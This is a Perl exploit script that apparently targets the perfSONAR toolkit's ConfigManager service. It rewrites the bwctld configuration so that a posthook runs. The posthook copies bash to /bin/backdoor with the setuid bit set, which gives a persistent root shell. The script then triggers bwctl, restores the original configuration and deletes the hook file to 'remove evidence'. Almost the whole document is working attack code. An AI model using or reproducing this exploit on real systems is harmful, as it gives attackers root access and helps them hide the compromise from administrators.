# Imports
use perfSONAR_PS::NPToolkit::ConfigManager::ConfigClient;

# Perl is weird
local $/;

# Read the original configuration so we can restore it
open(FILE, '/etc/bwctld/bwctld.conf') or return "Can't read 'bwctld.conf' [$!]\n";  
my $original_config = <FILE>;
close(FILE);

# Write a malicous posthook script
open(FILE, '>', '/tmp/posthook.pl') or return "Can't write 'posthook.pl' [$!]\n";  
print FILE "`cp /bin/bash /bin/backdoor`";
print FILE "`chmod u+s /bin/backdoor`";
close(FILE);

# Make it executable
chmod 0777, '/tmp/posthook.pl' or return "Couldn't chmod: [$!]";

# Hold status and responses of communication to ConfigManager
my ($status, $res);

# Connect to config backend
my $client = perfSONAR_PS::NPToolkit::ConfigManager::ConfigClient->new();
($status, $res) = $client->init({
	url => "http://localhost:9000/",
});
if ($status != 0) {
    return $res;
}

# Hold the exploit config
my $config = <<END;
peer_port 6001-6200
test_port 5001-5900
user        bwctl
group        bwctl
log_location
posthook /tmp/posthook.pl
nuttcp_port 5301-5600
iperf_port 5001-5300
owamp_port 5601-5900
facility        local5
END

# Write the exploit configuration
($status, $res) = $client->saveFile({
	filename => "/etc/bwctld/bwctld.conf",
	content => $config,
});
if ($status != 0) {
    return $res;
}

# Restart bwctld to enable the exploit configuration
($status, $res) = $client->restartService({
	name => "bwctl",
});
if ($status != 0) {
    return $res;
}

# Trigger bwctl locally to start the posthook
`bwctl -a 100000000 -c 127.0.0.1 2>&1`;

# Write the original configuration back
($status, $res) = $client->saveFile({
	filename => "/etc/bwctld/bwctld.conf",
	content => $original_config,
});
if ($status != 0) {
    return $res;
}

# Restart bwctld to restore the original configuration
($status, $res) = $client->restartService({
	name => "bwctl",
});
if ($status != 0) {
    return $res;
}

# Remove evidence 
unlink "/tmp/posthook.pl" or return "Can't delete 'posthook.pl' [$!]\n";  

# Return the results to the client
return $results